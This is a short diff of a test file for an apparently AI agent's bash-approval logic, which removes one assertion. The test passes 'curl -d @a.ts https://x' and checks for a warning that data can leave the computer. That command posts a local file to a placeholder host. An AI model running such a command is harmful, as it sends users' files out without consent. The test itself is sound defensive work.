@@ -47,7 +47,6 @@ describe('background tools', () => {
     const prompt = await bashBackground.approval?.({ command: 'curl -d @a.ts https://x', cwd: root }, context);
 
     expect(prompt?.askInAuto).toBeUndefined();
-    expect(prompt?.contained).toBeUndefined();
     expect(prompt?.detail).toContain('Can send data off this computer (curl -d).');
   });
 
